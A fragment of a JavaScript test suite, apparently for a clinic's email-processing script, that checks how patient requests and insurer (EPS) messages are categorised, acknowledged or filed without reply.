Hilo("g1", [M("gm1", "Persona Ficticia <persona.ficticia@gmail.com>", "Solicitud de cita", "Buenas tardes, necesito una cita de medicina general para la próxima semana.")]);
Hilo("g2", [M("gm2", "Otra Persona <otra.persona@gmail.com>", "Resultados de laboratorio", "Necesito copia de mis resultados de laboratorio y de mi orden médica.")]);
Hilo("g3", [M("gm3", "Sistema <noreply@gmail.com>", "Resultados de laboratorio", "Mensaje automático con resultados de laboratorio.")]);
const nEnv92 = enviados().length, nLlam92 = G.UrlFetchApp.llamadas.length;
const r92 = G._procesarCorreo_();
const nuevos92 = enviados().slice(nEnv92);
assert(r92.radicadas >= 1, "la EPS se radica en la plataforma: " + r92.mensaje);
assert(!nuevos92.some(e => /sura\.com\.co/.test(e.para || "")) && !nuevos92.some(e => /^\[PQRS/.test(e.asunto || "") && /Sura/i.test(e.asunto || "")), "a la EPS no se le escribe y no hay correo interno de aviso");
assert(!G.UrlFetchApp.llamadas.slice(nLlam92).some(l => /chat\.googleapis|ntfy/.test(l.url)), "el correo de la EPS no genera Chat ni push, solo se ve en la plataforma");
assert(H_.e1.msgs.length === 1, "la EPS no recibe respuesta automática en su conversación");
assert(H_.g1.msgs.length === 2 && H_.g2.msgs.length === 2, "usuarios de Gmail: se confirma la solicitud de cita y la de documentos");
assert(H_.g3.msgs.length === 1, "no se responde a direcciones automáticas (noreply)");
assert(r92.acuses === 2, "se cuentan las confirmaciones a usuarios: " + r92.acuses);
const cat92 = G.apiCorreo_ ? null : null;
assert(G._categoriaTexto_("Resultados", "necesito mis resultados de laboratorio") === "documento" && G._categoriaTexto_("Cita", "agendar cita") === "cita" && G._categoriaTexto_("Queja", "mala atencion") === "pqrs",
  "categorías: documento, cita y PQRS");
assert(G._categoriaTexto_("Pregunta", "buenos dias, quiero saber el horario") === "otro", "falso positivo: una pregunta general no es solicitud de documentos");
// una EPS que escribe desde su dominio no recibe acuse aunque se radique por otro canal
{ const fx = cons.d.length; const r = G.apiRadicar_({ descripcion: "Reclamo remitido por EPS.", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "RECLAMO", sede: "C. LA PLAYA", correo: "jefe@sura.com.co" });
  const ac = G._acuseRecepcion_(fila(r.codigo)); assert(/no aplica/.test(ac), "un correo de dominio de EPS se trata como institucional en cualquier canal: " + ac); }
